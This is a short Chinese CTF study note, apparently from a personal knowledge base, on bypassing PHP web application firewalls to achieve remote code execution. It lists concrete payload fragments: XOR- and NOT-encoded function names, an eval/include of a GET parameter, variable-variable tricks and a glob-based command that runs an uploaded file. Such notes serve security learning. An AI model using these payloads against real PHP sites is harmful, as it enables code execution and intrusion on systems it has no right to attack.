tags:: CTFWEB/RCE, CTFWEB/PHP/WAF绕过， CTFWEB/PHP/无字母数字RCE

- `'`
	- `"`
- `base_convert`
	- `chr` 拼接
- 空格和括号
	- `eval('include$_GET[url]?>');`
- hex
	- php的`"`支持转义: `"\x61"`
- 和，或，非等二进制操作
	- 异或
	- `((%fe%fe%fe%fe%fe%fe%fe)^(%8e%96%8e%97%90%98%91))();`
	- 取反
	- `${~'%99%93%9E%98'} # $flag`
	- 可以使用方括号构造数组并取第一个元素的方式绕过空格WAF
		- `[~%8c%86%8c%8b%9a%92][!%FF]`
- `$$`
	- ```php
	  $a = "b"
	  $b = "asd"
	  echo($$a) // 输出asd
	  ```
- 使用不可见字符作为变量名
- glob
	- ```
	  `?><?=`. /???/????????[@-[]`?>`	
	  ```
	- 需要配合文件上传,具体见[[CTFWEB/PHP/无字母数字RCE]]
- #### 从其他地方读取
	- 其他未被过滤的参数(GET 或者 POST)
	- session_id()
	- cookie
	- log
- [[CTFWEB/PHP/无字母数字RCE]]
- [[CTFWEB/PHP/特殊标签]]
- # webshell绕WAF技巧
	- [[CTFWEB/PHP/webshell]]